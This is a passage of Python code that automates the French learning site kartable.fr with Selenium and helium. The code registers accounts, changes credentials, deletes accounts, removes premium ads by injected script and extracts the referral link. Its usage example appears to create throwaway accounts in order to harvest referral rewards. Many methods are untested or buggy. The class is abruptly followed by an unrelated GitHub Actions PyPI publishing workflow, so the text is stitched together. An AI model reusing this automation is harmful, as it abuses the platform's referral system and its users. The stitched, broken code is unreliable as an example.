        helium.click("se connecter")

    def join_school(self):
        #!!!!!NOT TESTED YET!!!!!!
        self.driver.get(
            "https://www.kartable.fr/classe?navigationOrigin=ruby-quest")
        helium.write(self.ecole, into="Rechercher un établissement...")
        select = Select(self.driver.find_element_by_tag_name('select'))
        select.select_by_value('1')  # select the first
        helium.click("rejoindre")
        self.driver.find_element_by_class_name("icon-close").click()

    def delete_school(self):
        return "Not implemented yet"

    def change_email(self, new_email):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles/modifier-adresse-email
        for i in self.driver.find_element_by_tag_name("input"):
            helium.write(new_email, into=i)
        helium.click("mettre à jour")

    def change_password(self, new_password):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles/modifier-mot-de-passe
        helium.write(self.password, into="Mot de passe actuel")
        helium.write(new_password, into="Nouveau mot de passe")
        helium.write(new_password, into="Ressaisir nouveau mot de passe")
        helium.click("mettre à jour")

    def is_locked(self, ressource):
        return "Not implemented yet"
        # self.driver.find_element_by_class_name("document__state")#if child has class icon-document-locked :True

    @property
    def current_email(self):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles/modifier-adresse-email
        return self.driver.find_element_by_tag_name("strong").text

    def delete_account(self):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles
        helium.click("SUPPRIMER LE COMPTE")
        helium.click("SUPPRIMER DÉFINITIVEMENT")

    def levels_alternative(self):
        return "Not implemented yet"
        # requires status: not signed in
        # requires url: https://www.kartable.fr/
        tmp = self.driver.find_element_by_class_name("et_pb_text_inner")
        for i in tmp:
            if "Classes" == tmp.find_element_by_class_name("links-list__title"):
                # tmp.find_element_by_tag_name("a").href +.text
                pass

    @property
    def account_info(self):
        #!!!!!NOT TESTED YET!!!!!!
        # https://www.kartable.fr/compte/informations-personnelles
        firstname = self.driver.find_element_by_xpath(
            "//input[@name='firstName']")
        lastname = self.driver.find_element_by_xpath(
            "//input[@name='lastName']")
        birthdate = ""
        input__group = self.driver.find_element_by_class_name(
            "input__group--date")  # includes a bunch of select tags
        select = input__group.find_elements_by_tag_name('select')
        for i in select:
            birthdate += Select(i).first_selected_option.text+"/"
        tmp = ""
        for i in birthdate[:-1].split("/"):
            tmp += "0"+i+"/" if len(i) == 1 else i + "/"
        birthdate = tmp[:-1]
        return {"firstname": firstname, "lastname": lastname, "birthdate": birthdate}

    def set_birthdate(self):
        #!!!!!NOT TESTED YET!!!!!!
        if self.birthdate != None:
            day_to_be_set = self.birthdate[0]
            month_to_be_set = self.birthdate[1]
            year_to_be_set = self.birthdate[2]
            try:
                input__group = self.driver.find_element_by_class_name(
                    "input__group--date")  # includes a bunch of select tags
                select = input__group.find_elements_by_tag_name('select')
                for item in select:
                    if item.get_attribute("name") == "birthDateDay":
                        day = Select(item)
                        day.select_by_value(day_to_be_set)
                    elif item.get_attribute("name") == "birthDateMonth":
                        month = Select(item)
                        month.select_by_value(month_to_be_set)
                    elif item.get_attribute("name") == "birthDateYear":
                        year = Select(item)
                        year.select_by_value(year_to_be_set)
            except Exception as e:
                print("Failed to set birthdate", e)

    def subject_categories(self):
        return "Not implemented yet"
        #mm = [i for i in self.driver.find_elements_by_class_name("category__link")]

    def delete_premium_ads(self):
        #!!!!!NOT TESTED YET!!!!!!
        self.driver.execute_script(
            'try{document.getElementsByTagName("premium-link")[0].remove();}catch(error){console.error(error);}')
        self.driver.execute_script(
            'try{document.getElementsByClassName("cross-selling-ad")[0].parentElement.remove();}catch(error){console.error(error);}')

    @property
    def has_school(self):
        return "Not implemented yet"

    @property
    def subjects(self, classe):
        #!!!!!NOT TESTED YET!!!!!!
        self.unavailable = []
        self.courses_info = []
        # let it redirect to homepage to avoid spelling mistakes (instead of get("https://www.kartable.fr/cinquieme") for eg)
        self.driver.get("https://www.kartable.fr/")
        try:
            self.courses_info = [{i.text: i.get_attribute("href")} for i in self.driver.find_elements_by_class_name(
                "course__link")]  # href is None if not available
        except Exception as e:
            print("Failed to get course titles", e)
            self.courses_info = False

        try:
            for i in self.driver.find_elements_by_class_name("course--coming-soon"):
                self.unavailable.append(
                    i.find_element_by_class_name("course__link").text)
        except Exception as e:
            print("Failed to get name of future available subjects")
            self.unavailable = False
        return self.courses_info+self.unavailable

    @property
    def levels(self):
        return "Not implemented yet"
        """https://www.kartable.fr/{classe}"""
        helium.click(self.current_level)
        m = list(set(
            [i.text for i in self.driver.find_elements_by_class_name("school-year__level")]))
        self.driver.find_element_by_class_name("icon-close").click()

    @property
    def current_level(self):
        try:
            level = self.driver.find_element_by_class_name(
                "school-year__level").text
        except Exception as e:
            print("Failed to get the level", e)
            level = False
        finally:
            return level

    @property
    def sponso_url(self):
        self.driver.get(
            "https://www.kartable.fr/compte/parrainage?questIdentifier=sponsorship_fifth")
        time.sleep(5)
        self.driver.execute_script(
            'try{document.getElementsByTagName("input")[0].removeAttribute("readonly");}catch(error){console.error(error);}')
        self._sponso_url = self.driver.execute_script(
            'return document.getElementsByTagName("input")[0].value;')
        if not self._sponso_url.startswith("https://"):
            return False
        return self._sponso_url

    @property
    def ruby_amount(self):
        """Works for https://www.kartable.fr/rubis, https://www.kartable.fr/cinquieme, https://www.kartable.fr/ (because redirects to .../{classe}"""
        try:
            rubies = self.driver.find_element_by_class_name(
                "ruby-counter__total").text
        except Exception as e:
            print("Failed to get the amount of rubies", e)
            rubies = False
        finally:
            return rubies


"""
Usage:
    instance = main("6e","philotea","rotrions","manlymprinc1241478451ent@gmail.com","xfcgvhibu1457hoomskpjoihugyf")
    time.sleep(5)
    instance.register()
    ...
    url = instance.sponso_url
    instance.log_out()

""" 
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.x"

      - name: Build release distributions
        run: |
          # NOTE: put your own distribution build steps here.
          python -m pip install build
          python -m build

      - name: Upload distributions
        uses: actions/upload-artifact@v4
        with:
          name: release-dists
          path: dist/

  pypi-publish:
    runs-on: ubuntu-latest
    needs:
      - release-build
    permissions:
      # IMPORTANT: this permission is mandatory for trusted publishing
      id-token: write

    # Dedicated environments with protections for publishing are strongly recommended.
    # For more information, see: https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment#deployment-protection-rules
    environment:
      name: pypi
      # OPTIONAL: uncomment and update to include your PyPI project URL in the deployment status:
      # url: https://pypi.org/p/YOURPROJECT
      #
      # ALTERNATIVE: if your GitHub Release name is the PyPI project version string
      # ALTERNATIVE: exactly, uncomment the following line instead:
      # url: https://pypi.org/project/YOURPROJECT/${{ github.event.release.name }}

    steps:
      - name: Retrieve release distributions
        uses: actions/download-artifact@v4
        with:
          name: release-dists
          path: dist/

      - name: Publish release distributions to PyPI
        uses: pypa/gh-action-pypi-publish@release/v1
        with:
          packages-dir: dist/
